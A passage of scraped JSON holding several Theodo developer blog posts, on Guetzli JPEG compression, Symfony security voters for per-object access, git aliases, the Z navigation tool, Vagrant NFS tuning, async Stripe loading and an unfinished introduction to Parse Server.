\r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article has been translated in russian\u00a0here.\nAs you may already know, the average web page is now heavier than Doom.\nOne of the reasons for this increase is the weight of images, and the need to support higher resolutions.\nGoogle to the Rescue\nGoogle just published a new JPEG compression algorithm: Guetzli.\nThe main idea of this algorithm is to focus on keeping the details the human eye is able to recognize easily while skipping details the eye is not able to notice.\nI am no specialist, but the intended result is to get an image which percived quality is the same, but with a reduced filesize.\nThis is not a new image format, but a new way to compress JPEG images\nWhich means that there is no need for a custom image reader, the images are displayed by anything that already renders JPEGs.\nGuetzli in Real Life\nOn one of my projects, we had an image-heavy homepage (about 30Mb for the homepage alone, 27 of those only for the images).\nI decided to give Guetzli a try, to convince our product owner and our designer that the quality loss would be acceptable, I tried this new algorithm on one of the high-res image we were not using (a 8574\u00d75715, 22MB JPEG).\nIt crashed.\nAccording to google (and my experiences confirms the figures), Guetzli takes about 300MB RAM per 1Mpix of image (so about 15GB for the image I had) and I did not have that memory available at the time (half a dozen node servers, a couple docker containers, chromium and a couple electron instances were taking enough space to get my computer under the requirement).\nI retried after cleaning up every non-vital process, Guetzli took 12GB of RAM but succeeded.\nGoogle also states that it take about one minute per MPix for Guetzli to process an image, which is about the time it took me (a bit above 40minutes).\nThe resulting image weighted under 7MB (from 22MB), and I could not determine by looking at them which was the compressed one (our designer could, but admitted that the difference was \u201cincredibly small\u201d).\n6.9M    home-guetzli.jpg\r\n22M home-raw.jpg\r\n\nThat compression was made using Guetzli\u2019s default quality setting (which goes from 84 to 100, to get under 84 you would need to compile and use a version where you change the minimal value).\nMore Tests and Some Successes\nI then decided to try different quality settings for that image (wrote a very simple script to do that without having to relaunch the process every 40 minutes, and to be able to do it during my sleep).\nThe results are here (and it seems that Guetzli\u2019s default quality factor is 95).\n6.9M    ./home-guetzli.jpg\r\n22M ./home-raw.jpg\r\n3.0M    ./home-raw.jpg.guetzli84.jpg\r\n3.4M    ./home-raw.jpg.guetzli87.jpg\r\n4.2M    ./home-raw.jpg.guetzli90.jpg\r\n5.5M    ./home-raw.jpg.guetzli93.jpg\r\n8.8M    ./home-raw.jpg.guetzli96.jpg\r\n18M ./home-raw.jpg.guetzli99.jpg\r\n\nBoth the product owner and the designer agreed to go with the 84 quality factor. I then converted all our assets and we went from 30MB to less than 8MB for the homepage (3MB of those being the CSS/script).\nShould be noted that there was not any form of image compression before.\nCaveats\nThe installation of Guetzli on my machine was painless (someone set up an AUR package containing Guetzli on archlinux, thanks a lot to whoever did that), and running it is straightfoward (as long as you have enough RAM).\nThere seems to be a brew package (for macOs users), but I did not test it.\nGuetzli requires a lot of RAM and CPU time for huge images (a lot being relative, i.e. don\u2019t expect to be able to do anything while it\u2019s running).\nIf RAM is not your bottleneck you might even want to consider to run multiples instances of Guetzli in parallel on different images, as it is (as of this writting) only taking one core.\nBeing a JPEG encoder, it cannot output PNGs (so no transparency).\nBut it can convert and compress your PNGs.\nIt\u2019s efficiency is tied to the initial quality of the picture: I noticed the compression ratio going from 7x on the largest image to 2x on small images.\nThe quality loss was also more visible on those small images.\nOn a few cases I also witnessed a loss of color saturation (which was deemed acceptable in my case).\nTL;DR\nGive Guetzli a try, it might give you unacceptable results (especially with low quality), but it might save you a few MBs on your website.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Hannicq\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou think that your entities need some finer access controls?\nChanging the url in your admin panel gives access to hidden forms?\nYou\u2019ve heard of ACL (Access Control List) but can\u2019t really see it as a feasible solution?\nIf so then you\u2019re just like me.\nI\u2019ve started working on a decently sized project with a backend powered by Sonata for the last few weeeks when I was tasked with granting edit access for certain admins to edit an entity they own and nothing else.\nProblem: My problem was that my security configuration was set to use Roles and the application itself was too big to switch to an ACLs approach.\nIf this is also your case then let me take you through my solutions.\nSome context for easier understanding\nLet\u2019s imagine a really simple application.\nYou are the president of a group managing hundreds of hotels all over the world each supervised by a different general manager.\nYour application is to be used both by you and each manager to store information about each of to store and manage information on each of those hotels.\nNow in this simplest form, the application need to have two entities. A User and a Hotel entity.\nBased on those requirement, you have two roles emerging:\n\n\nPresident: He should be able to list, show, edit, create, delete all Hotel object. He is basically the super admin.\n\n\nGeneral Manager: He should only be able to show and edit a single object. Only one Hotel.\nOne of those role will be given to a User object at creation. \n\n\nThis means that your security.yml has to look something like that:\n#app/config/security.yml\r\nROLE_GENERAL_MANAGER:\r\n    - ROLE_APP_ADMIN_HOTEL_SHOW\r\n    - ROLE_APP_ADMIN_HOTEL_EDIT\r\nROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\r\n\nThis gives too much right to the general manager.\nHe can easily acces any hotel information simply by changing the id that will appear in the url when he is accessing his own.\nWhat can we do to fix that?\nThe quick and dirty way\nThe part where the request is handled is the controller. So the first thing that comes to mind is to put the security logic there.\nFor that we need to understand that sonata uses a default CRUD controller for all of its admin classes. To implement our custom logic, we need to override this behaviour.\nWe start by extending the current controller in our bundle and implement our little security logic.\n// AppBundle/Controller/CRUDController.php\r\nclass CRUDController extends Controller\r\n{\r\n    /**\r\n     * Override the default editAction to only allow a General Manager to modify it's hotel\r\n     *\r\n     * @param $id\r\n     * @return Response\r\n     */\r\n    function editAction($id = null)\r\n    {\r\n        $user = $this->getUser();\r\n        // We assume here that the user has a function that return the Hotel he is managing\r\n        $hotel = $user->getHotel();\r\n        if ($user->hasRole('ROLE_GENERAL_MANAGER') and $id != $hotel->getId()) {\r\n            throw new AccessDeniedException();\r\n        }\r\n\r\n        return parent::editAction($id);\r\n    }\r\n}\r\n\nAnd then we add the controller as the one to be used by the Hotel admin.\napp.admin.hotel:\r\n    class: AppBundle\\Admin\\Hotel\r\n    tags:\r\n      - { name: sonata.admin, manager_type: orm, group: app }\r\n    arguments: [null, AppBundle\\Entity\\Hotel, AppBundle:CRUD]\r\n\nNow each time we try to edit an hotel we are not managing we will get the desired 403 error.\nThis way of doing things have two main disadvantages.\n\nWe don\u2019t have access to the object itself which could be useful to implement the ownership logic.\nOur security logic is present in the controller and not isolated.\n\nSecurity voters\nIf we look at the code in the sonata default CRUD controller we can notice those 3 lines of code checking for access on an instance of an entity.\nif (false === $this->admin->isGranted('EDIT', $object)) {\r\n    throw new AccessDeniedException();\r\n}\r\n\nBehind the scene, the isGranted function will start the voter security process of Symfony.\nIt will ask voters to decide if the current user can perform an action (here \u201cEDIT\u201d) on a certain object.\nThe voters will then judge and give out an answer.\nTo handle the case of multiple voters, it is useful to change the voting strategy to unanimous in the security.yml of the application.\nThis mode means that if any voter were to block access to an object then the access would be blocked even if another one were to allow access.\nThis allows for a finer security configuration by stacking voters on the same class of object based on different conditions.\nThis can be done by adding the following:\n# app/config/security.yml\r\nsecurity:\r\n  access_decision_manager:\r\n    strategy: unanimous\r\n\nTo get back to our hotel and it\u2019s security, to ban General Manager from modifying the hotel that do not belong to them, we need to define a security voter that supports \u201cEDIT\u201d and the Hotel class.\nTo do that, we need to extend the base Voter class and override two of its functions:\n// AppBundle\\Security\\HotelVoter.php\r\nclass HotelVoter extends Voter\r\n{\r\n    private $decisionManager;\r\n\r\n    public function __construct(AccessDecisionManagerInterface $decisionManager)\r\n    {\r\n        $this->decisionManager = $decisionManager;\r\n    }\r\n\r\n    protected function supports($attribute, $object)\r\n    {\r\n        // if the attribute isn't one we support, return false\r\n        if (!in_array($attribute, array(\"ROLE_APP_HOTEL_EDIT\"))) {\r\n            return false;\r\n        }\r\n\r\n        // only vote on Hotel objects inside this voter\r\n        if (!$object instanceof Hotel) {\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    protected function voteOnAttribute($attribute, $object, TokenInterface $token)\r\n    {\r\n        $user = $token->getUser();\r\n        if (!$user instanceof User) {\r\n            // the user must be logged in; if not, deny access\r\n            return false;\r\n        }\r\n\r\n        // ROLE_SUPER_ADMIN can do anything\r\n        if ($this->decisionManager->decide($token, array('ROLE_SUPER_ADMIN'))) {\r\n            return true;\r\n        }\r\n\r\n        return $user === $object->getManager();\r\n    }\r\n}\r\n\nAll that\u2019s left is to register the security voter as a service with the right tags:\n# AppBundle/Resource/voters.yml\r\napp.hotel_voter:\r\n  class: AppBundle\\Security\\HotelVoter\r\n    tags:\r\n      - name: security.voter\r\n\nNow when our crafty admin try to access any hotel he is not managing, he will be faced with desired 403 error \ud83d\ude09\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMicha\u00ebl Mollard\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs programmers, we use Git everyday.\nThe time saved by a good Git config is remarkable!\nIn particular, amongst the most useful features of Git is the ability to create your own Git commands.\nAliases\nYou probably know about aliases.\nWho still has time to type git status? In 2017?\nWe all have the usual co = checkout or st = status in our .gitconfig, we\u2019re here for sexier stuff.\nHere is a compilation of useful aliases I\u2019ve created, adapted or shamelessy stolen from the interwebs.\nFeel free to take and share:\n[alias]\r\n    ###########################################\r\n    # The essentials\r\n    ###########################################\r\n    # -sb for a less verbose status\r\n    st = status -sb\r\n    # Easy commits fixup. To use with git rebase -i --autosquash\r\n    fixup = commit --fixup\r\n    # If you use Hub by Github\r\n    ci = ci-status\r\n\r\n    ###########################################\r\n    # The command line sugar\r\n    ###########################################\r\n    # Pop your last commit out of the history! No change lost, just unindexed\r\n    pop = reset HEAD^\r\n    # Fix your last commit without prompting an editor\r\n    oops = commit --amend --no-edit\r\n    # Add a file/directory to your .gitignore\r\n    ignore = \"!f() { echo \\\"$1\\\" >> .gitignore; }; f\"\r\n    # A more concise and readable git log\r\n    ls = log --pretty=format:\"%C(yellow)%h\\\\ %Creset%s%Cblue\\\\ [%cn]\\\\%Cred%d\" --decorate\r\n    # Same as above, with files changed in each commit\r\n    ll = ls --numstat\r\n    # Print the last commit title & hash\r\n    last = --no-pager log -1 --oneline --color\r\n\r\n    ###########################################\r\n    # This much sugar may kill you\r\n    ###########################################\r\n    # Show which commits are safe to amend/rebase\r\n    unpushed = log @{u}..\r\n    # Show what you've done since yesterday to prepare your standup\r\n    standup = log --since yesterday --author $(git config user.email) --pretty=short\r\n    # Show the history difference between a local branche and its remote\r\n    divergence = log --left-right --graph --cherry-pick --oneline $1...origin/$1\r\n    # Quickly solve conflicts using an editor and then add the conflicted files\r\n    edit-unmerged = \"!f() { git diff --name-status --diff-filter=U | cut -f2 ; }; vim `f`\"\r\n    add-unmerged = \"!f() { git diff --name-status --diff-filter=U | cut -f2 ; }; git add `f`\"\r\n\nWhat is the bang for?\nNote the git ignore command, alias to \"!f() { echo \\\"$1\\\" >> .gitignore; }; f\".\nThis looks weird, let\u2019s explain it:\nThe ! allows to escape to a shell, like bash or zsh.\nThen, we define a function f() that does what we want (here, appending the first argument to .gitignore).\nFinally, we call this function.\nI\u2019ve had a lot of trouble understanding why using a function is necessary, as the shell escaping does interpret positional parameters such as $1.\nIt\u2019s actually a neat trick: git appends your parameters to your expanded command (it is an alias after all) which leads to unwanted behavior.\nLet\u2019s see an example:\nLet\u2019s say you have the alias echo = !echo \"echoing $1 and $2\".\n$ git echo a b\r\nechoing a and b a b\r\n\nWow! What happened?\nGit expanded your alias escaping to a shell, which interpreted positional parameters.\nIt means that $ git echo a b was equivalent to $ echo \"echoing a and b\" a b, hence the output.\nNow wrapped in a function: echo = \"!f(){ echo \"echoing $1 and $2\"; };f\".\nIn this case, $ git echo a b is equivalent to $ f(){ echo \"echoing $1 and $2\" }; f a b.\nThe parameters still are appended (not interpreted by the shell because they\u2019re function parameters), but they are used in the call to the f function!\nWriting your own commands\nAliases are great, and their power is almost unlimited when using the !f(){...};f trick.\nBut you need to escape quotes and new lines, you don\u2019t have syntaxical coloration and it makes your ~/.gitconfig very long and unreadable.\nWhat if you want to do really complex stuff?\nDoeth not despair, for I have the solution.\nIt happens that Good Guy Git is looking in your $PATH when you call it with a command: typing $ git wow will look for an executable named git-wow everywhere in your $PATH!\nThis means you can define your own git commands easily by writing eg bash, python or by compiling an executable.\nLet\u2019s do that.\nHere is a simple git-wip bash script, that takes all changes and commit them with a \u201cWIP\u201d commit message.\nIf the last commit message already was \u201cWIP\u201d, amend this commit instead:\n#!/usr/bin/env bash\r\n\r\ngit add -A\r\n\r\nif [ \"$(git log -1 --pretty=%B)\" = \"WIP\" ]; then\r\n    git commit --amend --no-edit\r\nelse\r\n    git commit -m \"WIP\"\r\nfi\r\n\nAnd its friend, git-unwip that undo the last commit if its commit message was \u201cWIP\u201d, else it\u2019s a no-op:\n#!/usr/bin/env bash\r\n\r\nif [ \"$(git log -1 --pretty=%B)\" = \"WIP\" ]; then\r\n    git pop # defined as an alias, remember!\r\nelse\r\n    echo \"No work in progress\"\r\nfi\r\n\nPut these two scripts in your $PATH (/usr/local/bin for exemple), and you can call git wip or git unwip until your fingers bleed.\nThat\u2019s all folks\nNow run along kids, and go create your own aliases and custom commands!\nWhy not a script to start a new feature branch (sync with remote, prune local branches, create a new branch), or a script to open GitHub pull requests on multiple branches?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWilliam Duclot\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBonjour \u00e0 tous,\nNous organisons tout l\u2019\u00e9t\u00e9 des cours sur React au sein de Theodo. Cette 3\u00e8me session aura lieu le mercredi 2/08/2017 \u00e0 19h dans nos locaux pr\u00e8s du m\u00e9tro Rome. Nous l\u2019ouvrons aux personnes ext\u00e9rieures qui souhaitent apprendre \u00e0 mieux ma\u00eetriser ce framework Javascript. Elle sera sur le th\u00e8me de la mise en place de Redux et sera dirig\u00e9e par un de nos experts React Woody Rousseau\u00a0ici en conf\u00e9rence \u00e0 React Amsterdam.\n\nLa formation est gratuite et limit\u00e9e aux 10 premi\u00e8res personnes qui s\u2019inscriront. Une connaissance des bases de React est requise. Vous \u00eates les bienvenus et pour vous inscrire c\u2019est par ici.\n\u00c0 mercredi,\nMaxime\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe most famous shell command is definitely cd. It allows you to navigate through your file tree.\nSometimes, reaching the targetted folder can be a painful journey leading to a laborious and infinite sequence of cd and ls.\nThankfully, some workarounds exist to make navigation less laborious, let us mention three of them:\n\nEnable autosuggestion in your favorite shell\nOpen an integrated terminal within the targetted folder from the file explorer\nSet up an alias in the .{zsh, bash}rc file to store a given command\n\nNone of these approaches is really satisfying from a web developer\u2019s perspective as it can quickly get time-consuming.\nHow about we could cd into any folder with one single command? Let me introduce you Z.\nZ is a shell script that will learn from your shell history in order to get you to your favorite folders with one command.\nThe word \u2018favorite\u2019 has to be defined here: the most frequent and recent. Z is based on the \u2018frecency\u2019 concept widely used in the Web World to build a proper and consistent URIs ranking.\nTo put it simply, Z attributes a mark to all the folders you have visited with your shell since Z was installed.\nInstallation\nAre you ready to save a lot of time? Let\u2019s install the beast.\nClone the Z github project on your machine:\ngit clone https://github.com/rupa/z.git\r\n\nIn the ./bashrc or ./zshrc shell config file, add the following line at the bottom:\n. /path/to/z.sh\r\n\nTo end up the setup, you have to source the freshly updated shell config file:\nsource ./bashrc\r\n\nYou can also restart your terminal to enable the z command.\nFrom now on, perform your very last cds through your file tree to help Z learn about your habits and enrich its database accordingly.\nTrust me, after a day or two, you won\u2019t use cd anymore to reach your daily working project.\nCraZy Tips\nLet\u2019s take the example of Max who works on his startup website. The path of the project folder is the following one: /home/max/Documents/Very/Long/And/Painful/Path/To/My/Startup/Website\nGiven that Max frecently cd into it since Z installation, he can simply run the command z website to reach it. z web or even z w can do the magic too since the folder is the best match.\nZ script is smart enough to change the current directory based on the regex you provided.\nTo get the ordered list of visited folders, type z -l in your terminal.\n97.5       /home/max/Documents/path/to/Happiness\r\n128        /home/max/Documents/path/to/Success\r\n256        /home/max/Documents/path/to/Startup/Fundraising/Investors\r\n408        /home/max/Documents/path/to/Startup/Legal\r\n544        /home/max/Documents/path/to/Startup/Marketing\r\n822        /home/max/Documents/Very/Long/And/Painful/Path/To/My/Startup/Website\r\n\nAs you can see, you also get the current mark of each folder. The next section deals with the Maths behind the scenes.\nTo retrieve information about ranking or timing, you can use the z -r or z -t commands.\nThe Frecency Algorithm\nFrecency is a blend of \u2018frequency\u2019 and \u2018recency\u2019 words. The algorithm that computes the folders ranking is pretty simple and crazy damn powerful.\nWe have to consider it as a two dimensional problem with two variables: rank and time.\nThe rank is a metric to assess frequency whereas time is the date of folder last visit, stored as a timestamp in seconds.\nFirst part: each time a folder is visited its rank is incremented by one unit and its time is updated.\nSecond part: frecency formula\nIf the current folder has been visited during the:\n\nlast hour: frecency = rank * 4\nlast day: frecency = rank * 2\nlast 7 seven days: frecency = rank / 2\n\nOtherwise, frecency = rank / 4\nBy default, Z uses the frecency to compute the best match. However, you can use -r and -t options to respectively cd into the best matching folder based only on ranking or time criteria.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYohan Levy\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDo you wish your vagrant synced folders to have better performance? Especially if your host machine is running Linux. Here are some tricks to speed it up.\nSet up a synced folder\nVagrant is a convenient tool for quickly setting up your dev server, with just one vagrant up from the command-line, every team member can test new features locally.\nFor me, it is also essential to have a shared folder for the app\u2019s source code so that I can test my feature by simply saving the file from my favorite IDE and not having to deploy the code into the virtual machine every time.\nSetting up a basic synced folder is ridiculously easy as it only requires to add the following line in the Vagrantfile:\nconfig.vm.synced_folder \"src/\", \"/srv/website\"\nwith:\n\n\"src/\" synced folder path on your host\n\"/srv/website\" synced folder path on your guest\n\nWithout additional options, Vagrant will delegate the set up to your virtualization backend, e.g Virtualbox or VMware. Unfortunately, it is sometimes very slow.\nVagrant synced folders provides three alternatives:\n\nNFS (Network File System): default remote file system for Unix.\nRSync: slower than NFS, you would use it if nothing else works. Plus, rsync is one-way only.\nSMB (Server Message Block): only works with a Windows host.\n\nUsing NFS is therefore the best alternative in most situations.\nVagrant NFS\nTo set up an NFS synced folder you need to have nfsd (NFS server daemon) installed on your host and to specify it in your Vagrantfile as:\nconfig.vm.synced_folder \"src/\", \"/srv/website\", type: \"nfs\"\nWhen you reload your VM with vagrant reload, vagrant will do three things:\n\nIt will add an entry in the nfsd\u2019s configuration file /etc/exports on your host.\nIt will reload the NFS server daemon which will read the /etc/exports and accept connections.\nIt will connect to your guest machine and mount the remote folder.\n\nBoost your NFS\nNow, you might be happy with the default options. But sometimes, especially if you are a Linux user, you might feel that it is too slow. Luckily, Vagrant has a set of available options so let\u2019s tweak the NFS configuration a bit.\nThe NFS options that impact the speed of the synced folder can be separated in two categories:\n\nMount options (guest side):\n\n\"udp\" -> \"tcp\": The overhead incurred by TCP over UDP usually slows things down. However, it seems that the performance are slightly better with TCP in this particular case. (speed x1.5)\n\n\nNFSd options (host side):\n\n\"sync\" -> \"async\": in asynchronous mode, your host will acknowledge write requests before they are actually written onto disk. With a virtual machine, the network link between the host and guest is perfect so that there is no risk of data corruption. (speed x3)\n\n\n\nIf you want to override one option, you also need to write all the other default options. The optimal configuration in my situation is therefore:\nconfig.vm.synced_folder \"src/\", \"/srv/website\", type: \"nfs\",\r\n\u2003mount_options: ['rw', 'vers=3', 'tcp'],\r\n\u2003linux__nfs_options: ['rw','no_subtree_check','all_squash','async']\nFeel free to test which options work best for you.\nWith this setup, reloading a page of my app went from 9 to 2 seconds, making my work much easier. Moreover, I can finally access the legacy part of my application which timed out before.\nVincent Langlet, agile web developer at Theodo\nNote: File transfer speed can be easily measured with the dd utility :\ndd if=/dev/zero of=./test bs=1M count=100\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHugo Lime\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo.\r\n\r\nPassionate about new technologies to make web apps stronger and faster.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOn my current project, the team (and our client \ud83d\ude31) realised our React website performance rating was below industry-standard, using tools like Google Page Speed Insights.\nAs reported by the tool, the main cause for this are render-blocking scripts like Stripe, Paypal, fonts or even the bundle itself.\nLet\u2019s take Stripe as example.\nThe API of services like Stripe or Paypal are only available by sourcing from a <script /> tag in your index.html.\nIn the React code, the library becomes accessible from your Javascript window object once the script has loaded:\n<!-- ./index.html -->\r\n<script src=\"https://js.stripe.com/v2/\"></script>\r\n\n// ./somewhere/where/you/need/payment.js\r\nconst Stripe = window.Stripe;\r\n...\r\n\nThe solution is to delay the loading of the script (async or defer attributes in the <script />) to let your page display faster and thus get a better performance score.\nBut a problem happens when the bundle loads: the script may still not be ready at load time, in which case you won\u2019t be able to get its value from window for further use.\n<!-- ./index.html -->\r\n<script src=\"https://js.stripe.com/v2/\" async></script>\r\n\n// ./somewhere/where/you/need/payment.js\r\nconst Stripe = window.Stripe;\r\n\r\nconst validationFunctions = {\r\n  ...\r\n  validateAge: age => age > 17,\r\n  validateCardNumber: Stripe.card.validateCardNumber,\r\n  validCardCVC: Stripe.card.validateCVC,\r\n  ...\r\n}\r\n\nResult in the console:\n\nWith this code, Stripe can\u2019t be loaded after the bundle. Your bundle crashes!\n\n\n\nBut what is the impact of solving this problem?\nBusiness benefits of delaying the loading of your script\n\nYour website loads faster which leads to better customer retention\nYour website gets better SEO visibility\u2026\n\u2026 as proven by your better mark on performance benchmarks like Google Page Speed Insights\n\nObjective measures of your abilities are rare, take this opportunity to blow your client/stakeholder/team\u2019s mind!\n\u201cBut what good does Google Page Speed Insights?\u201d See below for yourself!\nBefore loading asynchronously. Here\u2019s how we ranked in the beginning:\n\n6 scripts are delaying the loading of our website. We want to get rid of all those items.\n\nResult after loading all scripts asynchronously: render blocking scripts have disappeared!\nScore on mobile is now 83/100 up from 56/100, and desktop performance is more than 90!\n\nThe Solution\nindex.html\n<!-- Load the script asynchronously -->\r\n\r\n<script type=\"text/javascript\" src=\"https://js.stripe.com/v2/\" async></script>\r\n\n./services/Stripe.js\n  // 1) Regularly try to get Stripe's script until it's loaded.\r\n\r\nconst stripeService = {};\r\nconst StripeLoadTimer = setInterval(() => {\r\n    if (window.Stripe) {\r\n      stripeService.Stripe = window.Stripe;\r\n      clearInterval(StripeLoadTimer);\r\n    }\r\n}, 100);\r\n\r\n// Customise the Stripe object here if needed\r\n\r\nexport default stripeService;\r\n\n./somewhere/where/you/need/payment.js\n// Use a thunk where an attribute of your Stripe variable is needed.\r\n\r\nimport stripeService from './services/stripe';\r\n\r\nconst validationFunctions = {\r\n  ...\r\n  validateAge: age => age > 17,\r\n  validCardNumber: (...args) => stripeService.Stripe.card.validateCardNumber(...args),\r\n  validCardCVC: (...args) => stripeService.Stripe.card.validateCVC(...args),\r\n  ...\r\n}\r\n\nWhy this architecture?\nWe have assigned the Stripe variable in a ./services/Stripe.js file to avoid re-writting the setInterval everywhere Stripe is needed.\nAlso, this allows to do some custom config of the Stripe variable in one place to export that config for further use.\nWhy use thunks?\nAt bundle load time, the Stripe variable is still undefined.\nIf you don\u2019t use a thunk, Javascript will try to evaluate at bundle load time the attributes of Stripe (here, Stripe.card for example) and fail miserably: your website won\u2019t even show.\nWhy use this weird stripeService object?\nIn ES6, export exports a live binding to the variable from the file it was created in.\nThis means that the variable imported in another file has at all times the same value as the one in the original file.\nHowever there is an exception: if you used the Stripe = window.Stripe and export default Stripe; syntax as usual, you only export a copy of Stripe evaluated at bundle load time and not a binding to the variable itself. So in that case you don\u2019t get the result of the assignment that happens in the setInterval after the <script /> is loaded if you merely export window.Stripe.\nThe airbnb-linter-complient trick to overcome this (thanks Louis Zawadzki!) is to wrap window.Stripe in a stripeService object.\nYou are all set on the path to 100/100 performance!\n\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tF\u00e9lix M\u00e9zi\u00e8re\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tInteresting fact: In October 2016, for the first time, the majority of the Internet traffic came from mobile devices.\nIt confirms mobile devices market as the priority for the next years and it motivates more and more people to jump into the adventure of \u201cCreate my App\u201d.\n\n  \nSome developers looking for a good app idea. (2017)\n\nBut developing an app is not an easy task. Indeed, besides obvious features for your app, you will need a complete infrastructure behind, with a database, a server, handling notifications, etc.\nTaking care of all this stuff takes a lot of time, work, tears, and doesn\u2019t bring business value. And as a developer, it requires a whole new set of skills to handle it.\nFor instance, you\u2019re at a hackathon. You want a quick prototype of your app, but you fail completely because of your broken backend which you spent half of the time to configure. Annoying, isn\u2019t it?\nAre we sentenced to write CRUD and setup backends all our lives? I say no!\n\n  \n\nIntroducing the BaaS\nAnd to support my No, I present the BaaS (for Backend as a Service). It will allow you to connect your mobile apps to cloud-based services by providing an API and SDKs. This includes key features like:\n\nUser management\nCloud storage\nPush notifications\nIntegration with social networking services\n\nAnd it\u2019s a booming market: in 2012, the BaaS market was worth 215 Million USD and it should be worth 28.10 Billion USD by 2020.\nObviously, competition is tough. How can we choose among all the BaaS offers?\n\n  \n\nParse Server\nDon\u2019t worry, I\u2019ve got this. For this perilous adventure, we will use Parse Server, a wonderful and powerful toolbox.\n\n  \n\n\nBut before using it, where does it come from?\nA quick history\nParse was founded in 2011. The firm was developing at the time Parse Platform, a BaaS (surprising, isn\u2019t it? \u00af\\_(\u30c4)_/\u00af).\nIt quickly gained in popularity to the point of being acquired by Facebook in 2013 for $85 million. In 2014, Parse was reported to power 500,000 mobile apps!\nSadly, in January 2016, Facebook announced that it would close Parse down, with services effectively shutting down in January 2017. But good news, Parse did open the application source code in order to allow users to perform the migration: this was the birth of Parse Server.\nWhat does it do?\nAlthough Parse Server is no longer really a BaaS, it does everything that I said.\nOne of the big advantages of Parse compared to its competitors is its impressive choice of SDK. Whether you need a common database for your iOS and Android apps, or if you want to store all the data from your Arduinos in a same place, Parse Server\u2019s got your back.\nIt has a dashboard where you can administrate multiple Parse instances, support Push notifications, Cloud Code, and soon Analytics.\n\n  \n  The Parse Server Dashboard\n\n\nIn addition, it\u2019s open source with almost 30k stars in total (counting SDKs, Dashboard, etc.) on GitHub. It\u2019s a living project which evolves very quickly.\nMy experience\nThere are other \u201creal\u201d BaaS existing on the market. Firebase, by Google, is a really good one. I chose 